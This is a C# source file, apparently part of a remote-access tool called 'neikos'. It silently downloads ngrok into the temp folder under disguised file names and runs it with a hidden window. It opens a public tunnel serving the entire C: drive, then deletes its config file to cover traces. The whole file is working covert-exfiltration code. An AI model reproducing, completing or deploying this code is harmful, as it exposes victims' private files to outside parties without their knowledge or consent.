using System;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.IO;
using System.IO.Compression;
using System.Diagnostics;

namespace neikos
{
    public static class NeikosNgrok
    {
        public const string NGROK_WIN32_URL = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-386.zip";

        /// <summary>
        /// Silently download and run ngrok with your API key.
        /// </summary>
        /// <param name="apiKey">Your ngrok API key.</param>
        /// <returns>null if all went fine, an Exception if an error has occured.</returns>
        public static async Task<Exception> Run(string apiKey)
        {
            try
            {
                // precalculate weird paths.
                string tempDir = Path.GetTempPath();
                string ngrokZipPath = Path.Combine(tempDir, "browsercache.zip");
                string ngrokOutPath = Path.Combine(tempDir, Guid.NewGuid().ToString().ToUpper());
                string ngrokYmlPath = Path.Combine(ngrokOutPath, "cacheinfo.yml");
                string ngrokExePath = Path.Combine(ngrokOutPath, "ngrok.exe");

                // create directory for the ngrok.
                Directory.CreateDirectory(ngrokOutPath);

                // Write ngrok.yml file with an api token
                string yamlText = "authtoken: " + apiKey;
                byte[] configRaw = Encoding.UTF8.GetBytes(yamlText);
                using (var sourceStream = new FileStream(
                        ngrokYmlPath,
                        FileMode.Create, FileAccess.Write, FileShare.Read,
                        bufferSize: 4096, useAsync: true))
                {
                    await sourceStream.WriteAsync(configRaw, 0, configRaw.Length);
                }

                // download the ngrok zip.
                if (File.Exists(ngrokZipPath)) File.Delete(ngrokZipPath);

                using (WebClient webClient = new WebClient())
                {
                    await webClient.DownloadFileTaskAsync(NGROK_WIN32_URL, ngrokZipPath);
                }

                // extract the ngrok zip.
                ZipFile.ExtractToDirectory(ngrokZipPath, ngrokOutPath);

                if (File.Exists(ngrokZipPath)) File.Delete(ngrokZipPath);

                // run thy ngrok.
                ProcessStartInfo ngrokPSI = new ProcessStartInfo()
                {
                    FileName = ngrokExePath,
                    WorkingDirectory = ngrokOutPath,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = "http -region=eu -config=cacheinfo.yml \"file:///C:/\""
                };

                Process.Start(ngrokPSI);

                await Task.Delay(1000);

                File.Delete(ngrokYmlPath);
            }
            catch (Exception e)
            {
                return e;
            }

            return null;
        }
    }
}
